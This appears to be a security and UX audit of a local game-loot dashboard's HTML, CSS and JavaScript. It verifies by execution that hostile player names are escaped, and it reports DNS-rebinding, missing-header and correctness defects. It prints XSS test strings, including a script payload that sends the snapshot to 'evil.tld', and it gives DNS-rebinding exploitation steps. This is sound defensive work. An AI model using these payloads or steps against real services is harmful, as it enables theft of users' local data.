# Frontend audit — `loot-ledger` dashboard

**Scope:** `src/web/assets/index.html` (263 lines), `src/web/assets/style.css` (863), `src/web/assets/app.js` (1076).
**Review type:** full-codebase, `quality-security`, plus a full website release audit (UI/UX, a11y, responsive, IA, release readiness).
**Date of pass:** audited against the working tree as found. No file was modified — `ls -l --time-style=full-iso src/web/assets/` shows mtimes of 12:50–12:53, all predating this session.

**Method — what was actually executed, not just read:**

| Check | How | Result |
|---|---|---|
| Parse | `node --check src/web/assets/app.js` | **passes** (node v24.21.0), before and after the pass |
| Sink sweep | `grep -aE 'innerHTML\|insertAdjacentHTML\|document.write\|eval(\|new Function\|DOMParser\|srcDoc\|javascript:\|\.href=\|localStorage\|postMessage\|fetch(\|setAttribute'` over all three assets | only two hits, both benign: `app.js:495` `th.setAttribute('scope','row')` and `app.js:1017` same-origin `fetch('/api/snapshot')` |
| Live backend | `./target/release/loot-ledger --no-capture --journal <hostile journal> --port 7399 --no-open` | ran; `GET /`, `/api/snapshot`, `/api/health`, `/api/events` all exercised |
| **Real app.js execution** | `app.js` run **unmodified** in a purpose-built minimal DOM shim, fed the **real** `hello`/`loot`/`player`/`status` frames from the live server | every behavioural claim below is an assertion on a produced DOM, not a reading of the source |
| Contrast | 40 real foreground/background pairings × 2 themes, resolved from the live `:root` token graph, WCAG relative-luminance formula | 38/40 pass their threshold; 2 "fails" are decorative hairlines (see V1) |
| Browser / screen reader / axe | **not available** — no Playwright, no jsdom, no axe-core, no display | all visual claims are marked *reasoned-from-source* |

**Re-verified against the current tree.** While this pass was running, sibling passes modified `src/web/{mod,http}.rs`, `src/main.rs`, `src/proto/photon.rs` and `src/store/mod.rs` (13:16–13:19). Every server-side claim here was therefore re-checked afterwards: `cargo build --release` (up to date), the server restarted on the rebuilt binary, and the full header probe and DOM assertion suite re-run. **Every result reproduced byte-identically**, and the frontend-facing contract is unchanged (same routes, same `hello` frame, same `{status, totals, counters}` status frame, same `: keep-alive` comment heartbeat, same GET/HEAD-only method restriction). The findings below are current as of the tree this report describes.


**No `package.json`, no lockfile, no npm dependency tree.** There is nothing to `npm audit`; the entire dependency surface is "whatever the user's browser implements". The absence of a `transition` anywhere in the CSS is a property, not an omission.

---

## 1. Executive summary

This is a well-built piece of frontend work for what it is. The three discipline claims the file's own header makes — `EventSource` owns the stream, rows are mutated not re-rendered, and **nothing from the network is ever parsed as markup** — are all true, and I verified the third one by execution rather than by reading, because it is the one that matters.

**The headline security answer: there is no untrusted-data-into-DOM defect.** I fed the live server a journal whose player names, guild names and item names are `<img src=x onerror=alert(1)>`, `"><script>fetch('/api/snapshot')…</script>`, `</td></tr><script>a()</script>`, a 601-character name, a name containing U+202E RIGHT-TO-LEFT OVERRIDE, a NUL byte, an embedded newline and a bidi isolate. Every one of those arrived at the browser **verbatim as a single `Text` node**. The rendered row serialised to exactly five `<td>` elements with the payloads HTML-escaped; the sr-only live region held one text child and zero elements. `app.js:134-139` (`el()` → `textContent`), `app.js:347` (`createTextNode(' ')`) and `app.js:137` are the whole story, and they hold. There is no `innerHTML`, no `insertAdjacentHTML`, no `eval`, no URL construction from server data, and no `Object.assign`/spread of a parsed JSON object onto anything, so there is no prototype-pollution path either.

The real risk is **not in the three files**. It is that the server has no `Host` validation, which leaves the classic DNS-rebinding hole open against a service whose entire payload is real player names (§S1). That is a server defect, outside the scope I was asked to fix, and I flag it because the brief's own threat model names it.

Against that, I found **no P0**. Twelve P2 defects and a long tail of P3s, none of which stops a single user from reading their own loot log. The most user-visible are: the screen-reader live region announces the **first** event of a burst while labelling it "Latest" (C1), the players panel claims to show "every player seen" and states a count it does not display when more than 500 have been seen (C2), and below 416 px the feed drops the timestamp entirely while the stylesheet's own comment promises it keeps "who took what, and when" (A1).

**Verdict: ship it.** It is well past the bar for a single-user local tool. Fix C1 and C2 before you call it done, because both are visible to the user in ordinary use and C1 is a false statement delivered to assistive tech.

---

## 2. Domain — product type and what that implies

A **single-user, local-only, read-only passive telemetry viewer** for one person's own game traffic.

What that implies for this review, and it changes the weighting of almost everything:

- **No auth, no secrets, no PII beyond other players' in-game names.** There is no session, no token, no cookie, no storage, no form that mutates anything, and no third-party origin. The entire attack surface is "can hostile *string content* escape into markup" and "who else can reach the port".
- **The client is a pure function of a server snapshot.** There is no optimistic update, no cache to invalidate, no hydration, no SSR. Every React-specific failure mode in the security skill's fault-pattern table — async effect races, dependency arrays, derived-state drift, context re-render cascades, hydration mismatch — is **inapplicable by construction**. I read the full `react-web-review.md` and the correct mapping of its checklist onto this codebase is: *stale closure → `n/a`*; *derived state drift → real, and it exists (C1, C2, C3)*; *HTML injection sink → checked, clean*; *client-only authz → n/a*; *redirect from untrusted input → n/a*.
- **Correctness beats polish, and honesty beats decoration.** A dashboard whose entire value is "what did that player just take from me" must never state a number it is not showing or a time it is not displaying. That is why C1, C2 and A1 are P2 and not P3, and why the eleven dead tokens (§D1) are P3: nobody is harmed by an unused token.
- **Uptime is a feature.** This runs for hours next to a live game client. Anything that leaks memory, thrashes the main thread, or silently drifts from the server's truth is worse here than in a page you load once.
- **The real users are one person on a desktop, and sometimes on a phone in the same zone.** Mobile matters for the feed's `≤26rem` collapse (A1) and not much else; the roster's roster-cap issue (C2) only appears in a busy zone or over a long session.

---

## 3. Prior-pass claims — verified

The brief asked me to check these rather than repeat them. Five of six hold; **one is false**; one number does not reproduce.

| Claim | Verdict | Evidence |
|---|---|---|
| "Measured WCAG contrast, 52 token pairs × 2 themes" | **Conclusion holds, the number does not reproduce.** I can only find **40** real fg/bg pairings in the stylesheet, and 11 of the 45 declared tokens are never referenced, so many "pairs" could not have existed. **Every real text pair passes ≥4.5:1 and every meaningful non-text pair passes ≥3:1 in both themes** — the claim's substance is correct and better than advertised. See §3.1. | measured, table in §3.1 |
| "Three distinct empty states" | **Verified for the feed, understated overall.** The feed has three (verified by execution): *"Waiting for the game"* → *"No loot yet"* on `sawTraffic`, plus *"No matches"* when filtering. The roster has two. The `EventSource`-unsupported path adds a fourth and a fifth. | `app.js:617-641` (executed), `app.js:649-658`, `app.js:944-947` |
| "Capped 300-row feed, one `<tr>` at a time" | **Verified by execution.** 350 live `loot` frames → exactly 300 `<tr>` in `<tbody>`, newest first, oldest retained is the 50th. `addFeedRow` inserts one row and trims from the tail; nothing re-renders a table. | `app.js:429-442`, `app.js:27`; executed |
| "`role="status"` plus a coalescing sr-only live region" | **Structure verified, behaviour defective.** `#conn` is `role="status"`; `#announce` is `role="status" aria-live="polite"` and is empty in the markup, so the region exists before its text changes — the code gets that right. Coalescing works and the count is right. **But the text it announces as "Latest" is the first event of the window.** | `index.html:46`, `index.html:259`, `app.js:794-820` → **C1** |
| "`prefers-reduced-motion` handled" | **Verified, and stronger than claimed.** There is exactly one animation in the whole file (`ll-row-in`, a background fade) and it is inside `@media (prefers-reduced-motion: no-preference)`. There is not a single `transition` property anywhere. The skip link's `transform` is an instant snap with no transition, which is the correct behaviour under reduced motion. | `style.css:812-826`; `grep -aE 'transition\|animation\|@keyframes'` returns only lines 218, 222 (`transform`) and 814, 817 (the gated animation) |
| "`forced-colors` handled" | **Mostly verified, with one casualty it does not cover.** Focus ring → `CanvasText`, connection dot → `Highlight`/`CanvasText` with `forced-color-adjust: none`, `.you`/`.coverage-tag` → `CanvasText`. But the **`.stats` 1px tile grid is drawn with `background`, which forced-colors overrides to `Canvas` — those separators disappear entirely.** | `style.css:831-854`, `style.css:369-377` → **A5** |
| **"A gold accent used for exactly one meaning ('you')"** | **FALSE.** `var(--accent)` is referenced in **five** rules with **three** distinct meanings, and the stylesheet's own comment asserts the opposite of the truth. | `style.css:37` vs `style.css:278, 560, 569, 573, 669` → **D2** |

### 3.1 The measured contrast table

Resolved from the live token graph in `style.css:24-143` (dark) and `style.css:57-85` (light), against the WCAG 2.x relative-luminance formula. Thresholds: normal text 4.5, non-text / 1.4.11 3.0.

| Pairing | Dark | Light | Threshold | Verdict |
|---|---|---|---|---|
| `--text-primary` on page / surface / raised / inset | 17.25 / 15.97 / 13.79 / 17.25 | 14.58 / 15.94 / 13.56 / 14.58 | 4.5 | pass |
| `--text-secondary` on page / surface / raised / inset | 9.22 / 8.53 / 7.37 / 9.22 | 7.45 / 8.15 / 6.93 / 7.45 | 4.5 | pass |
| `--text-faint` on page / surface / raised / inset | 5.88 / 5.45 / **4.70** / 5.88 | 5.24 / 5.73 / **4.87** / 5.24 | 4.5 | pass (0.20 / 0.37 of headroom) |
| `--accent` on surface / page / raised (`.you` 11px/650, `.coverage-tag`, `.pname` 14px/600) | 8.73 / 9.43 / 7.54 | 5.82 / 5.32 / 4.95 | 4.5 | pass |
| `--accent-rule` 1px border on surface / page | 4.80 / 5.18 | 4.34 / 3.97 | 3.0 | pass |
| `--accent` 3px self-row bar on surface / raised | 8.73 / 7.54 | 5.82 / 4.95 | 3.0 | pass |
| `--status-ok` / `-warn` / `-crit` on surface and page (13px text) | 9.99 / 8.80 / 6.13 · 10.78 / 9.50 / 6.62 | 5.55 / 5.44 / 6.74 · 5.07 / 4.97 / 6.17 | 4.5 | pass |
| connection dot 9px, three states + idle, on surface | 9.99 / 8.80 / 6.13 / 5.45 | 5.55 / 5.44 / 6.74 / 5.73 | 3.0 | pass |
| `--border-control` on inset (input) / on surface (skip-link, noscript) | **3.64** / 3.37 | **3.13** / 3.43 | 3.0 | pass — **light-mode input border has only 0.13 of headroom** |
| `--focus-ring` on page / surface / raised / inset | 11.03 / 10.21 / 8.82 / 11.03 | 5.01 / 5.47 / 4.66 / 5.01 | 3.0 | pass |
| `--border-subtle` on surface / on page | **1.45 / 1.56** | **1.53 / 1.40** | — | **not a 1.4.11 failure** — see V1 |

The stylesheet's own claim at `style.css:13-16` — "body and UI text is ≥ 4.5:1 and the focus ring and control borders are ≥ 3:1 against every surface they can land on, in both themes" — is **accurate as written**. It does not claim `border-subtle` meets 3:1, and it should not.

Two things worth carrying forward: the **light-theme `--border-control` on `--bg-inset` at 3.13:1** is the tightest real margin in the system and any future darkening of `--p-n-50` in light mode breaks it; and the **`prefers-contrast: more` override at `style.css:858-863` works correctly**, promoting `--border-subtle` to `--p-n-50` (3.37 dark / 3.43 light, both ≥3) and `--text-faint` to `--p-n-70` (8.53 / 8.15).

---

## 4. Confirmed findings

Confirmed means: reproduced by execution, or read directly off a specific line with no inference. Style opinions are quarantined in §6.

### S1 — [P1, **suspected**] No `Host` validation leaves the dashboard open to DNS rebinding

- **Category:** Security. **Confidence: high on the code evidence, unproven end-to-end** (I have no browser, so I did not demonstrate a rebind).
- **Location (server side, outside the three audited files):** `src/web/mod.rs:234-257` routes purely on `request.path`; `src/web/http.rs:314-326` writes only `content-type`, `content-length`, `cache-control: no-store` and `connection`; `src/main.rs:396` binds `("127.0.0.1", opts.port)`.
- **What could go wrong:** a page the user visits in any browser can take a hostname it controls, serve it from an attacker IP with `TTL 0`, then flip the same name to `127.0.0.1`. From the page's point of view `http://that-name:7331` is now **same-origin**, so CORS does not apply and `fetch('/api/snapshot')` returns the full document — every player name, guild, item and timestamp from the user's session — to attacker script. The user sees a game-tool dashboard they never opened. `HttpOnly` does not help; there is no cookie. This is the standard hole in every local HTTP service that validates the path but not the `Host`.
- **Verified mitigations already in place** (all confirmed by `curl -D -` against the live server): binds `127.0.0.1` only, never `0.0.0.0`; **no `Access-Control-Allow-Origin` on any response**, so a plain cross-origin `fetch` from `http://evil.tld` is blocked by the browser; `cache-control: no-store` on every response, so player names are not written to the disk cache.
- **Verification step:** with the binary on 7399, from a browser console on a page served from a hostname you control with a 0-second TTL, rebind that name to `127.0.0.1` and `await (await fetch('http://<name>:7399/api/snapshot')).text()`. If that resolves, the finding is confirmed; a `Host` allowlist of `127.0.0.1:port`, `localhost:port` and `[::1]:port` in `src/web/mod.rs:234` closes it in three lines.
- **Note:** I was instructed not to modify `.rs` files, and this is a one-line server fix, not a frontend fix. It is reported because the brief's threat model names "another local process/user reading the port" and because it is the one finding in this audit that can exfiltrate the data this whole project exists to log.

### S2 — [P2] No `Content-Security-Policy` and no `X-Content-Type-Options`

- **Category:** Security / defence in depth. **Location:** `src/web/http.rs:314-326` (confirmed absent on `/`, `/api/snapshot` and `/api/events`).
- **What could go wrong:** nothing today — the client is clean. The problem is that the *next* contributor adds a `title`-tooltip helper, or an item-catalogue link, or an `insertAdjacentHTML` for a "compact feed" mode, and there is no policy to stop it or to make the regression visible in a browser console. For a service with **no auth of any kind**, `default-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` is the cheapest available compensating control, and its absence is the single most consequential hardening gap in the HTTP layer.
- **Verification:** `curl -sSD - -o /dev/null http://127.0.0.1:7399/ | grep -i 'content-security\|nosniff'` → empty (confirmed).

### S3 — [P2] No `X-Frame-Options` / `frame-ancestors` — the dashboard can be framed by any site

- **Category:** Security / UI spoofing. **Location:** `src/web/http.rs:314-326`.
- **What could go wrong:** any page can `<iframe src="http://127.0.0.1:7331/">`. It cannot script into it (cross-origin) and cannot read it, so there is no data leak — but it can overlay a fraudulent copy of the dashboard on top of the real one to social-engineer a click or to hide a state, and it removes the browser's usual "this page is unusual" cues. A `frame-ancestors 'none'` directive in a CSP (S2) fixes this and S2 together.

### S4 — [P2] Any local process or user can enumerate the session with no authentication

- **Category:** Security / accepted risk, undocumented in the UI. **Location:** `src/main.rs:396`; no auth anywhere in `src/web/mod.rs:234-257`.
- **What could go wrong:** on a shared or multi-account machine any local user, any process, or any browser on the box can `curl 127.0.0.1:7331/api/snapshot` and read every player name the user has seen. This is the brief's threat (a) and it is inherent to the design.
- **The finding is not "add auth"** — that would be wrong for a local tool. The finding is that **the dashboard's own footer never tells the user this**. `index.html:176-183` spends a paragraph on coverage limits and then asserts *"A passive log of your own traffic — no overlay, no positions, nothing injected"*, which reads as a privacy guarantee about the *data in*, and says nothing about the *data out*. A single line in the footer — that anything on this machine can read this port — costs one sentence and converts a silent exposure into an informed one.

### S5 — [VERIFIED CLEAN] Untrusted data cannot reach the DOM as markup

- **Category:** Security. **This is the finding that matters and it is a pass.** Recorded here with its full evidence so the next reviewer does not have to re-derive it.
- **Static:** the sink sweep in the header of this report found `setAttribute` once (`app.js:495`, a literal `scope="row"`) and `fetch` once (`app.js:1017`, the same-origin constant `'/api/snapshot'`). There is no `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `createContextualFragment`, `DOMParser`, `srcDoc`, `setAttribute('on…')`, `location.*`, `window.open`, `postMessage`, `localStorage` or `sessionStorage` anywhere in the three files.
- **Every untrusted field is a `textContent` write:** `el()` at `app.js:134-139` is the only element factory and it assigns `node.textContent`; `app.js:347` and `app.js:390` use `createTextNode`; `applyName` (`app.js:355-358`) and `makeTimeCell` (`app.js:188`) mutate `textContent`; `dom.*.textContent` is the only writer for the footer and totals.
- **`dataset` is not a markup sink.** `tr.dataset.player = rec.by` (`app.js:370`), `tr.dataset.search = …` (`app.js:412-422`, `app.js:575`) go through the DOMStringMap, which is an attribute write, not an HTML parse.
- **Executed, against the live server, with the real `app.js` unmodified:**

  ```
  payload by   = <img src=x onerror=alert(1)>
  payload from = "><script>alert(1)</script>
  payload item = </td></tr><script>a()</script>
  → top row is an element (a <tr>), not a parsed fragment : TR
  → top row child ELEMENTS (5 <td>, none injected)        : TD,TD,TD,TD,TD
  → any <img>/<script> element anywhere under it          : 0
  → row textContent contains the payload verbatim         : true
  → row serialised as markup escapes it                   : true
  → row serialised contains a real <img tag?              : false
  → itemName </td></tr><script> escaped?                  : true
  → hostile guild from a later `player` frame            : 0 <img>, 0 <b> elements; text preserved
  → #announce node children are all Text nodes            : true (1 child)
  ```

- **The payload really did traverse the whole stack.** The server parsed the hostile journal lines and emitted them byte-for-byte: the name round-tripped as `<img src=x onerror=alert(1)>`, the guild as `"><script>fetch("/api/snapshot").then(r=>r.text()).then(t=>fetch("http://evil.tld/?"+encodeURIComponent(t)))</script>`, and U+202E, U+2066, a NUL byte, a newline and a zero-width space all survived into the parsed JS string. The escaping happened only at the DOM boundary, which is exactly where it should.
- **One nuance worth recording:** `itemName` is *less* attacker-controlled than the brief assumed. On the live capture path `src/game/mod.rs:264-274` resolves the name from the embedded 11,963-item catalogue by `item_num_id` and never trusts the wire for it. The hostile `itemName` only reaches the client via **journal replay**, where `apply_loot` re-applies an already-resolved record (`src/game/mod.rs:293-297`). The correct conclusion is unchanged — the client must and does treat it as untrusted — but the realistic hostile-string surface is `name`, `guild` and `alliance`, all of which come straight off the game server and all of which were proven to reach the DOM as text.
- **Bidi/control characters are not neutralised (P3, `app.js:134-139`).** A player named `Evil\u202Egpj.exe` renders with the Latin run reversed, which is a genuine spoofing primitive: it can make one name *look* like another in the roster. Given the tool's entire purpose is attributing loot to named players, stripping U+202E/U+2066-U+2069/zero-width characters from `name`/`guild` before display is a proportionate hardening step. **This is a hardening recommendation, not a confirmed defect** — the game cannot currently be assumed to emit them.

### C1 — [P2] The live region announces the *first* event of a burst while calling it "Latest"

- **Category:** Correctness / accessibility. **Location:** `app.js:794-800` (`queueAnnouncement`) and `app.js:808-819` (`flushAnnouncement`).
- **Evidence.** `queueAnnouncement` increments the count on an existing `pendingAnnounce` but never replaces `pending.rec`; `flushAnnouncement` then builds its sentence from `pending.rec` and prefixes `pending.count > 1 ? … 'Latest: ' + line`.
- **Executed, five distinct `loot` frames inside one 2-second window:**

  ```
  announce text        : "5 new grabs. Latest: P1 looted ITEM-NUMBER-1 from Victim."
  says "5 new grabs"   : true      (the count is correct)
  names the LAST event : false
  names the FIRST event: true      (the item was ITEM-NUMBER-5; the fifth event)
  ```
- **What could go wrong.** In a busy fight the burst is exactly when the user needs the announcement. `#announce` is by design the *only* channel a screen-reader user gets — `index.html:254-259` says so explicitly, so that a growing `<tbody>` is not re-read. During a contested boss kill the user is told, in the authoritative polite voice of the app, that the most recent grab was something that happened up to two seconds ago and is not. On the roster this is worse than a cosmetic slip: the user reads "Latest: Grim looted X" and concludes Grim is looting when the current victim is someone else.
- **Fix (one line):** in `queueAnnouncement`, always set `pendingAnnounce.rec = rec`, keeping the separate `count`. Then the sentence names the true latest and the count stays right.
- **Verification:** drive ≥3 `loot` events with distinct `at`/`itemName` inside one `ANNOUNCE_MS` window and assert the flushed text contains the last event's label.

### C2 — [P2] The Players panel states a count it does not display, and silently discards rows past 500

- **Category:** Correctness / information architecture. **Location:** `app.js:28` (`MAX_ROSTER_ROWS = 500`), `app.js:556-560` (silent tail trim), `app.js:698-701` (`renderMeta`), `app.js:677-679` (`renderTotals`), `index.html:148-151` (the caption).
- **Evidence — executed twice.** With 620 distinct `player` frames:

  ```
  roster rows in DOM (cap 500)     : 500
  roster-meta text                : "620 players"
  t-players stat tile             : 620
  MISMATCH rows vs stated count?  : 500 rows vs "620 players"
  ```

  And against the live server's own 614-player snapshot: 500 rows in the DOM, 114 players dropped, header `"613 players"`.
- **What could go wrong.** The panel's own sr-only caption promises *"Every player seen, most recently active first"*, and the header states a count, and the stats strip states a count. In a popular zone or a long session the user is told there are 620 players and shown 500, with no "showing 500 of 620", no scrollbar that would reveal a truncation, and no visual cue at the tail. A user doing kill-steal triage scrolls to the bottom of the roster, sees the list simply end, and concludes that is everyone. That is the tool's core task being silently truncated.
- **Aggravating detail.** A player evicted by the cap is silently re-inserted the next time they loot (`app.js:566-568` → `ensureRosterRow`), which evicts the last row again. The visible set therefore churns around whoever is currently active, with nothing on screen saying so.
- **Fix:** the feed already solves this correctly — `app.js:690-693` switches to `"N grabs · newest 300 shown"` at the cap. Apply the same shape to the roster, and raise the cap or note it in the caption.
- **Verification:** replay a journal with >500 distinct `looted_from`/`looted_by` names and assert `roster-meta` discloses the ratio, as it already does when a filter is active.

### A1 — [P2] Below 26rem the feed loses "when", contradicting the comment that justifies the collapse

- **Category:** Accessibility / responsive / IA. **Location:** `style.css:757-761` (the rationale) vs `style.css:794-797` (the rule).
- **Evidence.** The comment states: *"Nothing folds away without a reason: the secondary columns go first and the row keeps the two things that answer 'who took what, and when'."* The narrow-end block then removes `.c-from` at ≤44rem (`style.css:763-766`) **and `.c-time` at ≤26rem** (`style.css:794-797`). At 416 px the feed renders Player · Item · Qty. The "when" is gone, with no fallback: the `<time>` element that carries the full locale string in `title` (`app.js:186`) is itself inside the hidden cell, so no tooltip survives either.
- **What could go wrong.** The same class-based selectors correctly hide header and body cells together (I checked every cell factory: `app.js:378-408` and `494-511` all apply the shared class, so the claim at `style.css:758-761` that "a column is never half-hidden" is true) — but that same care means the *time* column disappears completely, not partially. A user on a phone in a PvP zone gets a live list of who is taking what from whom-and-when that answers "what" and "who" and nothing about "when", which is the one thing you need to reconstruct a kill-steal dispute.
- **Severity note:** this is a deliberate, reasoned product decision with one over-reach. I rate it P2 rather than P3 because the comment states the opposite invariant, so the next maintainer will trust the comment and be surprised.
- **Fix (small):** keep a compact time — e.g. hide the seconds rather than the cell, or move the timestamp into the `<time>`'s `title` *and* surface it via the item cell's `aria-describedby` for assistive tech. Reasoned-from-source; I could not render a 375 px viewport to confirm the resulting density.
- **Verification:** at 375 px, confirm the feed still communicates recency per row, and that the stylesheet comment and the rules agree.

### C3 — [P3] The "Players" stat tile and the Players panel header can disagree

- **Category:** Correctness. **Location:** `app.js:677-679` uses `Math.max(int(totals.players), players.size)`; `app.js:701` uses `players.size` alone.
- **Evidence:** against the live 614-player snapshot the stat tile read **614** while the panel header read **613**, simultaneously, on one screen. The tile's `Math.max` is defensive against a `player` frame arriving before its `loot` frame; the header has no such guard and counts only what the client has materialised.
- **What could go wrong:** a one-off, but it is the kind of one-off that destroys trust in a numbers-first dashboard the first time a user spots it. The header is also wrong on its own terms once the cap bites (C2).
- **Verification:** replay the same journal and compare `t-players` with `roster-meta`; they should always be equal.

### C4 — [P3] The announcement renders "… from ." when `from` is empty

- **Category:** Correctness / content. **Location:** `app.js:811` and `app.js:816`.
- **Evidence — executed:** an event with `from: ''` produced
  `"Grim picked up 5,000 silver from ."`.
- **Why the client is inconsistent with itself:** the *feed row* guards this — `app.js:389` only emits the `←` cell `if (rec.from)` — but the two announcement sentences at `app.js:811` and `app.js:816` concatenate `str(rec.from)` unconditionally, and `str('')` is `''` (`app.js:147-149`).
- **Reachability:** on the live capture path `src/game/events.rs:82-85` falls back to `looted_by` when the field is absent, so `from` is empty only if `looted_by` is also empty — unlikely. It **is** reachable through journal replay, a supported input: a journal line with `"fr":""` is accepted by `src/store/mod.rs:208` and reaches the client intact, which is how I produced it. So: a copy defect on a documented input path, not a crash and not a live-capture hazard.
- **Fix:** branch on `rec.from` the way `app.js:389` already does.
- **Verification:** replay a journal containing `{"k":"loot","s":true,"fr":"", …}` and read `#announce`.

### C5 — [P3] The "capture stopped" state is unreachable dead code

- **Category:** Correctness / maintainability. **Location:** `app.js:954-960`; `setConn` call sites are `app.js:941, 956, 958, 963` only.
- **Evidence.** The `running === false` check lives exclusively in the `open` handler, which fires only when the `EventSource` (re)connects. `app.running` is set `false` in exactly one place, `src/main.rs:528`, immediately before `shared.stop()` and process exit. `setConn` is never called from the `status` listener (`app.js:981-1009`) or from `applyStatus` (`app.js:765-777`), so a live `status` frame carrying `running: false` changes nothing on screen. By the time the client learns the process is stopping, the stream has already dropped and the `error` handler has set *"reconnecting…"* — which is also wrong, because the process is not coming back.
- **What could go wrong:** a user whose capture dies sees the dashboard promise a reconnect that will never happen. Today the window is a few hundred milliseconds before the process exits entirely, so the impact is cosmetic. It becomes a real defect the moment anyone makes capture stoppable without exiting — which is the obvious next feature.
- **Verification:** drive a `status` frame with `running:false` on an already-open stream and assert `#conn` changes state. It does not.

### C6 — [P3] With no loot yet *and* a filter typed, the feed says "No matches" instead of "Waiting for the game"

- **Category:** UX / content. **Location:** `app.js:617-635`. `showFeedEmpty` is true when `feedRows === 0`, and the copy branch checks `filtering` first, so the "no data yet" copy is unreachable whenever a filter is non-empty.
- **What could go wrong:** the user opens the dashboard mid-session with nothing captured, types a name to look for an earlier player, and is told the filter found nothing — which is true but omits the more useful fact that nothing has been captured at all. The "Waiting for the game" state, the one that explains *why* the page is empty, is exactly the state the user cannot reach.
- **Fix:** make the `feedRows === 0` case take precedence over `filtering` in the copy branch.
- **Verification:** load with an empty feed, type into `#q`, read `#empty-title`.

### C7 — [P3] The "no `EventSource`" message can be clobbered by the HTTP fallback 6 s later

- **Category:** Correctness / error handling. **Location:** `app.js:1065` schedules `fallbackSnapshot` unconditionally; `app.js:940-949` bails out of `connect()` after writing the "This browser cannot run the dashboard" copy; `renderHello` then calls `updateEmptyState()`, which overwrites it (`app.js:617-641`).
- **What could go wrong:** in a browser with `fetch` but no `EventSource`, the user sees the explanatory error for up to six seconds and then watches it silently morph into the ordinary "Waiting for the game" state, with a populated table and a `#conn` reading *"unsupported browser"* — a contradictory screen. Narrow (essentially pre-2016 browsers), but the two fallbacks were clearly written independently and they fight.
- **Fix:** set a flag when `connect()` bails and have `fallbackSnapshot` respect it, or call `fallbackSnapshot` from inside `connect()` only on the non-bail path.
- **Verification:** run with `EventSource` deleted from the global scope and `fetch` present; advance a fake clock past 6 s.

### C8 — [P3] A reconnect discards the locally accumulated feed tail

- **Category:** Correctness / UX. **Location:** `app.js:914-915` (`replaceChildren`) and `app.js:934` (scroll restoration) in `renderHello`.
- **Evidence.** The server's `feed` is capped at 200 (`src/web/mod.rs:206`, `recent(200)`) while the client keeps 300 (`app.js:27`). After a reconnect the table is rebuilt from the server's 200 and the 100 newest rows the user had been watching — plus every row received since the last snapshot, from any client — are gone. `renderMeta` then reports `"N grabs · newest 200 shown"` once the count is back under the 300 threshold it reports the plain total, so the truncation is invisible in the unfiltered, under-cap case.
- **What could go wrong:** an `EventSource` reconnect after a brief network blip silently rewinds the user's view. The scroll position *is* preserved (`app.js:889, 934`) — good — so the user is left looking at different content at the same scroll offset, which is worse than a jump.
- **Fix:** disclose it in `renderMeta` by comparing `shown` against the row count actually received, or keep client-received rows and merge.

### C9 — [P3] `timeCells` is never reset when the snapshot replaces the tables

- **Category:** Performance / correctness. **Location:** `app.js:128` (module-level array), `app.js:1052-1063` (the 1 Hz sweep), `app.js:914-915` (the `replaceChildren`).
- **What could go wrong:** after every reconnect the array transiently holds ~800 detached nodes. The `isConnected` check in the sweep removes them within one tick, so this is self-healing and bounded — I rate it P3 because the fix is a one-liner (`timeCells.length = 0` next to the `replaceChildren`) and because the same omission would matter if the sweep ever ran less often.

### C10 — [P3] The 500-row roster window churns silently

- **Category:** Correctness. **Location:** `app.js:546-562` and `app.js:564-569`.
- **What could go wrong:** a player evicted by the cap is re-inserted by `updateRosterRow` on their next `loot` frame, evicting the last row. Over a long session in a busy zone the visible set becomes "the 500 most recently active", which is defensible — but it is neither stated nor stable, and it compounds C2.

### F1 — [P3] Up to ~800 DOM text writes per second from the relative-time ticker

- **Category:** Performance. **Location:** `app.js:1052-1063`.
- **What could go wrong:** the 1 Hz sweep rewrites `textContent` on every `<time>` younger than `RECENT_MS + TICK_MS`, i.e. up to 300 feed rows + 500 roster rows in a busy zone, plus an unconditional `renderZone()` every second regardless of whether the value changed. That is a forced style recalculation over the whole table each tick for the life of the tab.
- **Severity note:** I did **not** measure this and have no browser; I am reasoning from the DOM write count. At 800 writes/second a modern engine handles it without a visible frame drop, so this is an efficiency note, not a performance defect. The cheap improvement is to skip a cell whose rendered second has not changed, and to gate `renderZone()` on a value change — which also removes the `now` from the render path.
- **Verification:** record a performance profile in a real browser with a 300-row feed; I could not.

### V1 — [not a finding] `--border-subtle` at 1.40–1.56:1 is a decorative hairline, not a 1.4.11 failure

Recorded because it is the only pair in the system under 3:1 and a future reviewer will otherwise rediscover it as a defect. WCAG 1.4.11 applies to *"graphical objects required to understand the content"*. `--border-subtle` paints panel outlines, row separators, the sticky-header underline, and the 1 px gaps in the `.stats` tile grid (`style.css:369-377`, `434`, `487`, `500`) — none of which is the sole means of understanding anything: the header row is independently distinguished by `text-transform: uppercase`, `font-weight: 600`, `--fs-xs` and a `--text-faint` colour at 5.45:1, and it detaches on scroll because it is `position: sticky`. The one place it *is* load-bearing is `style.css:858-863`, and there `prefers-contrast: more` already promotes it to `--p-n-50` at 3.37/3.43. No action.

### V2 — [not a finding] No prototype-pollution path from `JSON.parse`

Recorded because the threat model invites it. `readJson` (`app.js:824-831`) returns the parsed object and the client assigns it to `state.snapshot` and `state.counters` wholesale (`app.js:891-893`), but it never spreads, `Object.assign`s or merges a parsed object into anything — the only aggregation structures are `players` (a `Map`, `app.js:118`) and `rowData` (a `WeakMap`, `app.js:125`). A `__proto__` key in the JSON becomes an own property of the parsed object and does not reach `Object.prototype`. No finding.

---

## 5. Unknowns — things I could not verify

These are genuine gaps, not soft-pedalling. Anything below is **reasoned-from-source** and must be checked in a browser before it is believed.

1. **No browser at all.** No Playwright, no jsdom, no axe-core, no display. Consequently every claim about *rendered* layout, reflow, sticky-header behaviour under `border-collapse: separate`, focus-ring appearance, scroll anchoring, text clipping, and the visual density of the ≤26rem feed is reasoned-from-source only. My DOM shim (`/mnt/data/Project/Albion_stuff/.audit-scratch/dom.mjs`) models nodes and text but has no layout engine, so it can prove *what the DOM says* and never *what it looks like*.
2. **No screen reader.** Whether two polite live regions (`#conn` and `#announce`) interleave, drop, or queue under NVDA/JAWS/VoiceOver is unverified. This is the standard caveat for every `aria-live` implementation and it is the reason C1 matters more than its P2 suggests.
3. **No `forced-colors`, `prefers-contrast` or `prefers-reduced-motion` rendering.** A5 (the `.stats` grid vanishing) is read off the CSS cascade, not observed.
4. **DNS rebinding was not demonstrated** (S1). The code evidence for the missing `Host` check is direct and unambiguous; the end-to-end exploit is not, and I am not claiming it.
